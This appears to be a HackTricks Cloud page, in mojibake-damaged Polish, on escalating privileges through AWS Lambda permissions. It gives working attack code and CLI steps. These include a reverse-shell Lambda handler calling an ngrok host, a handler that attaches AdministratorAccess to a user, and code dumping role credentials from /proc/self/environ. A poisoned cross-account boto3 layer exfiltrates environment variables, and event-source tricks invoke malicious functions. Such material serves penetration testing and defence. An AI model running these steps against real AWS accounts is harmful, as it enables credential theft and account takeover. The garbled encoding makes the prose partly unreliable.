# AWS - Eskalacja uprawnieÅ„ w Lambda

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## lambda

WiÄ™cej informacji na temat lambdy znajdziesz w:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

UÅ¼ytkownicy posiadajÄ…cy uprawnienia **`iam:PassRole`, `lambda:CreateFunction`** oraz **`lambda:InvokeFunction`** mogÄ… eskalowaÄ‡ swoje uprawnienia.\
MogÄ… **utworzyÄ‡ nowÄ… funkcjÄ™ Lambda i przypisaÄ‡ jej istniejÄ…cÄ… rolÄ™ IAM**, nadajÄ…c funkcji uprawnienia zwiÄ…zane z tÄ… rolÄ…. UÅ¼ytkownik moÅ¼e nastÄ™pnie **napisaÄ‡ i przesÅ‚aÄ‡ kod do tej funkcji Lambda (na przykÅ‚ad z odwrÃ³conym powÅ‚okÄ…)**.\
Po skonfigurowaniu funkcji uÅ¼ytkownik moÅ¼e **uruchomiÄ‡ jej wykonanie** i zamierzone dziaÅ‚ania, wywoÅ‚ujÄ…c funkcjÄ™ Lambda za pomocÄ… interfejsu API AWS. Ten sposÃ³b umoÅ¼liwia uÅ¼ytkownikowi wykonywanie zadaÅ„ poÅ›rednio za poÅ›rednictwem funkcji Lambda, dziaÅ‚ajÄ…c na poziomie dostÄ™pu przyznanego roli IAM z niÄ… zwiÄ…zanym.\

AtakujÄ…cy moÅ¼e wykorzystaÄ‡ to do uzyskania **odwrÃ³conej powÅ‚oki i kradzieÅ¼y tokena**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
MoÅ¼esz rÃ³wnieÅ¼ **wykorzystaÄ‡ uprawnienia roli lambda** bezpoÅ›rednio z funkcji lambda. JeÅ›li rola lambda ma wystarczajÄ…ce uprawnienia, moÅ¼esz ich uÅ¼yÄ‡, aby przyznaÄ‡ sobie prawa administratora:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Jest rÃ³wnieÅ¼ moÅ¼liwe wyciekanie poÅ›wiadczeÅ„ roli lambdy bez koniecznoÅ›ci zewnÄ™trznego poÅ‚Ä…czenia. ByÅ‚oby to przydatne dla **izolowanych sieciowo lambd** uÅ¼ywanych do wewnÄ™trznych zadaÅ„. JeÅ›li istniejÄ… nieznane grupy zabezpieczeÅ„ filtrowania odwrÃ³conych powÅ‚ok, ten fragment kodu pozwoli Ci bezpoÅ›rednio wyciekaÄ‡ poÅ›wiadczenia jako wynik lambdy.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencjalne zagroÅ¼enie:** BezpoÅ›rednie podniesienie uprawnieÅ„ do dowolnej roli usÅ‚ugi lambda.

{% hint style="danger" %}
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e chociaÅ¼ **`lambda:InvokeAsync`** wydaje siÄ™ interesujÄ…ce, **nie pozwala ono samodzielnie na wykonanie polecenia `aws lambda invoke-async`**, potrzebujesz rÃ³wnieÅ¼ uprawnienia `lambda:InvokeFunction`.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Podobnie jak w poprzednim scenariuszu, moÅ¼esz **przyznaÄ‡ sobie uprawnienie `lambda:InvokeFunction`**, jeÅ›li masz uprawnienie **`lambda:AddPermission`**.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do dowolnej roli usÅ‚ugi Lambda.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

UÅ¼ytkownicy posiadajÄ…cy uprawnienia **`iam:PassRole`, `lambda:CreateFunction`** i `lambda:CreateEventSourceMapping` (a potencjalnie rÃ³wnieÅ¼ `dynamodb:PutItem` i `dynamodb:CreateTable`) mogÄ… poÅ›rednio **podnieÅ›Ä‡ uprawnienia**, nawet bez `lambda:InvokeFunction`. 
MogÄ… utworzyÄ‡ funkcjÄ™ Lambda z zÅ‚oÅ›liwym kodem i przypisaÄ‡ jej istniejÄ…cÄ… rolÄ™ IAM.

Zamiast bezpoÅ›rednio wywoÅ‚ywaÄ‡ funkcjÄ™ Lambda, uÅ¼ytkownik konfiguruje lub wykorzystuje istniejÄ…cÄ… tabelÄ™ DynamoDB, Å‚Ä…czÄ…c jÄ… z funkcjÄ… Lambda za pomocÄ… mapowania ÅºrÃ³dÅ‚a zdarzeÅ„. Ta konfiguracja zapewnia, Å¼e funkcja Lambda jest **automatycznie uruchamiana po dodaniu nowego elementu** do tabeli, zarÃ³wno przez dziaÅ‚anie uÅ¼ytkownika, jak i inny proces, co poÅ›rednio wywoÅ‚uje funkcjÄ™ Lambda i wykonuje kod z uprawnieniami przekazanej roli IAM.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
JeÅ›li DynamoDB jest juÅ¼ aktywny w Å›rodowisku AWS, uÅ¼ytkownik musi jedynie **ustawiÄ‡ mapowanie ÅºrÃ³dÅ‚a zdarzeÅ„** dla funkcji Lambda. Jednak jeÅ›li DynamoDB nie jest uÅ¼ywane, uÅ¼ytkownik musi **utworzyÄ‡ nowÄ… tabelÄ™** z wÅ‚Ä…czonym strumieniowaniem:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Teraz jest moÅ¼liwe **poÅ‚Ä…czenie funkcji Lambda z tabelÄ… DynamoDB** poprzez **utworzenie mapowania ÅºrÃ³dÅ‚a zdarzeÅ„**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Z funkcjÄ… Lambda poÅ‚Ä…czonÄ… ze strumieniem DynamoDB, atakujÄ…cy moÅ¼e **poÅ›rednio uruchomiÄ‡ funkcjÄ™ Lambda, aktywujÄ…c strumieÅ„ DynamoDB**. MoÅ¼na to osiÄ…gnÄ…Ä‡ przez **wstawienie elementu** do tabeli DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do okreÅ›lonej roli usÅ‚ugi Lambda.

### `lambda:AddPermission`

AtakujÄ…cy posiadajÄ…cy te uprawnienia moÅ¼e **przyznaÄ‡ sobie (lub innym) dowolne uprawnienia** (to generuje polityki oparte na zasobach, ktÃ³re umoÅ¼liwiajÄ… dostÄ™p do zasobu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli usÅ‚ugi lambda poprzez nadanie uprawnienia do modyfikacji kodu i jego uruchamiania.

### `lambda:AddLayerVersionPermission`

AtakujÄ…cy posiadajÄ…cy to uprawnienie moÅ¼e **nadaÄ‡ sobie (lub innym) uprawnienie `lambda:GetLayerVersion`**. MoÅ¼e uzyskaÄ‡ dostÄ™p do warstwy i szukaÄ‡ podatnoÅ›ci lub poufnych informacji.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potencjalne skutki:** Potencjalny dostÄ™p do poufnych informacji.

### `lambda:UpdateFunctionCode`

UÅ¼ytkownicy posiadajÄ…cy uprawnienie **`lambda:UpdateFunctionCode`** majÄ… potencjalnÄ… moÅ¼liwoÅ›Ä‡ **modyfikacji kodu istniejÄ…cej funkcji Lambda powiÄ…zanej z rolÄ… IAM.**\
AtakujÄ…cy moÅ¼e **zmodyfikowaÄ‡ kod lambdy w celu wycieku poÅ›wiadczeÅ„ IAM**.

ChociaÅ¼ atakujÄ…cy moÅ¼e nie mieÄ‡ bezpoÅ›redniej moÅ¼liwoÅ›ci wywoÅ‚ania funkcji, jeÅ›li funkcja Lambda jest juÅ¼ istniejÄ…ca i dziaÅ‚a, prawdopodobne jest, Å¼e zostanie uruchomiona poprzez istniejÄ…ce przepÅ‚ywy pracy lub zdarzenia, co poÅ›rednio uÅ‚atwia wykonanie zmodyfikowanego kodu.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli usÅ‚ugi lambda.

### `lambda:UpdateFunctionConfiguration`

#### Wprowadzenie

[**Warstwy Lambda**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) pozwalajÄ… na doÅ‚Ä…czanie **kodu** do funkcji lambda, ale **przechowywanie go osobno**, dziÄ™ki czemu kod funkcji moÅ¼e pozostaÄ‡ maÅ‚y, a **kilka funkcji moÅ¼e wspÃ³Å‚dzieliÄ‡ kod**.

WewnÄ…trz lambdy moÅ¼na sprawdziÄ‡ Å›cieÅ¼ki, z ktÃ³rych Å‚adowany jest kod Pythona za pomocÄ… funkcji podobnej do tej:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Oto miejsca:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na przykÅ‚ad, biblioteka boto3 jest Å‚adowana z `/var/runtime/boto3` (4. pozycja).

#### Wykorzystanie

**DoÅ‚Ä…czenie warstwy do funkcji** wymaga tylko uprawnienia `lambda:UpdateFunctionConfiguration`, a **warstwy mogÄ… byÄ‡ udostÄ™pniane miÄ™dzykontowe**. MusielibyÅ›my rÃ³wnieÅ¼ wiedzieÄ‡, **jakie biblioteki sÄ… uÅ¼ywane**, abyÅ›my mogli je poprawnie zastÄ…piÄ‡, ale w tym przykÅ‚adzie zaÅ‚oÅ¼ymy, Å¼e atakowana funkcja importuje boto3.

Dla bezpieczeÅ„stwa, uÅ¼yjemy narzÄ™dzia Pip do zainstalowania tej samej wersji biblioteki boto3 z Å›rodowiska uruchomieniowego Lambda, na ktÃ³re jesteÅ›my nastawieni (Python 3.7), aby nie byÅ‚o Å¼adnych rÃ³Å¼nic, ktÃ³re mogÅ‚yby powodowaÄ‡ problemy w docelowej funkcji. Obecnie to Å›rodowisko uruchomieniowe uÅ¼ywa wersji boto3 1.9.42.

Za pomocÄ… poniÅ¼szego kodu zainstalujemy bibliotekÄ™ boto3 w wersji 1.9.42 i jej zaleÅ¼noÅ›ci w lokalnym folderze "lambda\_layer":
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
NastÄ™pnie otworzymy `/lambda_layer/boto3/__init__.py` i dodamy zÅ‚oÅ›liwy kod. Payload, ktÃ³ry bÄ™dziemy dodawaÄ‡, wyglÄ…da tak:

![](<../../../.gitbook/assets/image (26).png>)

`requests` jest importowane z `botocore`. Funkcja bÄ™dzie eksfiltrowaÄ‡ zmienne Å›rodowiskowe, a try-except i timeout 0.1 sÄ… tam, aby zapewniÄ‡, Å¼e ten kod nie zepsuje niczego.

{% hint style="info" %}
**WaÅ¼na uwaga:** Nie powinieneÅ› juÅ¼ uÅ¼ywaÄ‡ `from botocore.vendored import requests` w prawdziwych testach penetracyjnych, poniewaÅ¼ w dziennikach CloudWatch tej funkcji zostanie wydrukowane ostrzeÅ¼enie o przestarzaÅ‚oÅ›ci, co prawdopodobnie spowoduje, Å¼e zostaniesz wykryty przez obroÅ„cÄ™.
{% endhint %}

Teraz spakuj ten kod do **pliku ZIP** i **zaÅ‚aduj** go do **nowej warstwy Lambda w koncie ATAKUJÄ„CEGO**. Najpierw musisz utworzyÄ‡ folder "python" i umieÅ›ciÄ‡ w nim biblioteki, aby po zaÅ‚adowaniu ich do Lambdy kod moÅ¼na byÅ‚o znaleÅºÄ‡ w "/opt/python/boto3". Upewnij siÄ™ rÃ³wnieÅ¼, Å¼e warstwa jest kompatybilna z Pythonem 3.7 i Å¼e **warstwa znajduje siÄ™ w tym samym regionie co nasza docelowa funkcja**. Gdy to zostanie zrobione, uÅ¼yjemy `lambda:AddLayerVersionPermission`, aby **udostÄ™pniÄ‡ warstwÄ™ publicznie**, dziÄ™ki czemu nasze docelowe konto bÄ™dzie mogÅ‚o z niej skorzystaÄ‡. UÅ¼yj swoich osobistych poÅ›wiadczeÅ„ AWS do tego wywoÅ‚ania API.
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Teraz, majÄ…c **skompromitowane poÅ›wiadczenia**, uruchomimy nastÄ™pujÄ…ce polecenie na naszej docelowej funkcji Lambda "s3-getter", ktÃ³re **doÅ‚Ä…czy naszÄ… warstwÄ™ Lambda miÄ™dzykontowÄ…**.
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
NastÄ™pnym krokiem bÄ™dzie albo **wywoÅ‚anie funkcji** samodzielnie, jeÅ›li jest to moÅ¼liwe, albo oczekiwanie, aÅ¼ zostanie wywoÅ‚ana w normalny sposÃ³b - co jest bezpieczniejszÄ… metodÄ….

**Bardziej skrytym sposobem na wykorzystanie tej podatnoÅ›ci** moÅ¼na znaleÅºÄ‡ w:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ dla uÅ¼ywanej roli usÅ‚ugi Lambda.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

MoÅ¼e z tymi uprawnieniami bÄ™dziesz w stanie utworzyÄ‡ funkcjÄ™ i wywoÅ‚aÄ‡ jÄ…, wywoÅ‚ujÄ…c URL... ale nie mogÅ‚em znaleÅºÄ‡ sposobu, aby to przetestowaÄ‡, wiÄ™c daj mi znaÄ‡, jeÅ›li uda ci siÄ™ to zrobiÄ‡!

### Lambda MitM

NiektÃ³re lambdy bÄ™dÄ… **otrzymywaÄ‡ wraÅ¼liwe informacje od uÅ¼ytkownikÃ³w w parametrach**. JeÅ›li uzyskasz RCE w jednej z nich, bÄ™dziesz mÃ³gÅ‚ wydobyÄ‡ informacje, ktÃ³re inni uÅ¼ytkownicy do niej wysyÅ‚ajÄ…, sprawdÅº to w:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## OdwoÅ‚ania

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
